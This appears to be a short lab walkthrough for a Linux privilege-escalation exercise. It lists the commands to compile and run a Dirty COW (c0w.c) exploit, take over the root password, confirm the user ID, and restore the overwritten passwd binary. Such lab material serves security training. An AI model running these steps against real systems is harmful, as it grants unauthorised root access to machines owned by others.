## Exploitation

**Linux VM**

1. In the command prompt, type:
   ```bash
   gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
   ```
2. Run the compiled exploit:
   ```bash
   ./c0w
   ```
   *Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.*

3. Change the root password:
   ```bash
   passwd
   ```
4. Check your user ID:
   ```bash
   id
   ```
5. To revert changes, either copy `/tmp/passwd` back to `/usr/bin/passwd` or reset your machine.
